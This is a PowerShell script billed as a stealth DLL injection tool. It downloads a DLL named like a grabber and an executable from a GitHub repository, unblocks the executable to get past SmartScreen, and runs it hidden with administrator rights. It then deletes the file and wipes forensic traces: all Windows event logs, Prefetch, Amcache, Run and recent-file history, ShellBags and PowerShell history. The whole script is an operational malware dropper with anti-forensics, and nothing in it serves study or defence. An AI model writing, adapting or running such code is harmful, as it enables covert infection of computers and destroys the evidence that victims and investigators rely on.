# ================================
# DLL Injection Tool (Stealth Mode)
# ================================

# STEP 0: Download DLL before anything else
$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-g*abber.dll"
$dllPath = "D:\virtualbox\KaliLinux\Logs\badmos-g*abber.dll"

# Create directory if it doesn't exist
$dir = Split-Path $dllPath
if (-not (Test-Path $dir)) {
    New-Item -Path $dir -ItemType Directory -Force | Out-Null
}

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue

# Wait for 2 seconds
Start-Sleep -Seconds 2

# STEP 1: Define GitHub EXE URL & Temp Path
$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
$tempPath = "$env:TEMP\ConsoleApplication6.exe"

# STEP 2: Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing -ErrorAction SilentlyContinue

# STEP 3: Unblock to prevent SmartScreen
Unblock-File -Path $tempPath -ErrorAction SilentlyContinue

# STEP 4: Run the EXE silently as admin
$proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# STEP 5: Remove EXE after injection
Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue

# STEP 6: Stealth Cleanup Logs
Start-Job -ScriptBlock {
    try {
        # Clear Windows Event Logs
        wevtutil el | ForEach-Object { wevtutil cl $_ } > $null 2>&1

        # Delete Prefetch
        Remove-Item -Path "$env:SystemRoot\Prefetch\*" -Force -ErrorAction SilentlyContinue

        # Clear Amcache (Program execution history)
        Remove-Item -Path "C:\Windows\AppCompat\Programs\RecentFileCache.bcf" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\Windows\AppCompat\Programs\Amcache.hve" -Force -ErrorAction SilentlyContinue

        # Clear Run Dialog history
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

        # Clear Recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

        # Clear ShellBags
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {}
} | Out-Null
# STEP 7: Clear PowerShell history
try {
    # Clear in-memory history
    [System.Management.Automation.PSConsoleReadLine]::ClearHistory() 2>$null

    # Clear history file on disk
    $historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $historyFile) {
        Remove-Item -Path $historyFile -Force -ErrorAction SilentlyContinue
    }
} catch {}
